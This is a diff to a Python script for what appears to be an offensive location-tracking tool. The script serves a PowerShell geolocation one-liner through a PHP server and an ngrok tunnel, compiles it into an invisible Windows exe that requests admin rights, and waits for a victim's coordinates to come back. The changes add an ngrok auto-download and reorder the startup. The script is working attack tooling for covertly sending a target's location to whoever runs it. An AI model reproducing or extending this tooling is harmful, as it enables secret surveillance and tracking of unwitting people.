@@ -1,11 +1,14 @@
-from os import system
+from os import system, path
 import shutil
 from time import sleep
 import re
 import multiprocessing
+from wget import download
+from platform import system as systemos, architecture
 
 RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
-print(r"""
+def banner():
+    print(r"""
 	
 		  _       _                 _       
 	__      _(_)_ __ | | ___   ___ __ _| |_ ___ 
@@ -18,14 +21,31 @@ print(r"""
 
 
 
-""")
+    """)
+
+def checkNgrok():
+    if path.isfile('ngrok') == False: 
+        print("[*] Ngrok Not Found !!")
+        print("[*] Downloading Ngrok...")
+        ostype = systemos().lower()
+        if architecture()[0] == '64bit':
+            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
+        else:
+            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
+        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
+        download(url)
+        system('unzip ' + filename)
+        system('rm -Rf ' + filename)
+        system('clear')
+checkNgrok()
 
 system('cp Template/get-location-oneliner.ps1 ./ > /dev/null')
 system("rm location.loc 2> /dev/null")
 system("touch location.loc")
 
-print(GREEN + " [+] Starting php\n"+ DEFAULT)
+
 def runServer():
+    print(GREEN + " [+] Starting php\n"+ DEFAULT)
     system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
 
 
@@ -56,18 +76,18 @@ def subst():
 def compile():
     cmp = input(" [+] Windows system type you want to compile for x86/x64: ")
     if cmp == 'x64':
-        print(GREEN + " [+] Compiling to exe\n" + DEFAULT)
+        print(GREEN + " [+] Compiling to exe" + DEFAULT)
         system("wine Ps1_To_Exe_x64.exe /ps1 get-location-oneliner.ps1 /exe location.exe /x64 /invisible /uac-admin")
         print(CYAN + " [+] Output file location.exe generated" + DEFAULT)
     elif cmp == 'x86':
-        print(GREEN + " [+] Compiling to exe\n" + DEFAULT)
+        print(GREEN + " [+] Compiling to exe" + DEFAULT)
         system("wine Ps1_To_Exe.exe /ps1 get-location-oneliner.ps1 /exe location.exe /invisible /uac-admin")
         print(CYAN + " [+] Output file location.exe generated" + DEFAULT)
     else:
         compile()    
 
 def getcords():
-    print(GREEN + " [+] Waiting for location"+ DEFAULT)
+    print(GREEN + "\n [+] Waiting for location"+ DEFAULT)
     while True:
         
         with open('location.loc') as cords:
@@ -80,11 +100,11 @@ def getcords():
 
 if __name__ == "__main__":
     try:
-        runServer()
+        banner()
+        multiprocessing.Process(target=runServer).start()
         ngrok()
         subst()
         compile()
-        multiprocessing.Process(target=runServer).start()
         getcords()
     except KeyboardInterrupt:
         exit(0)
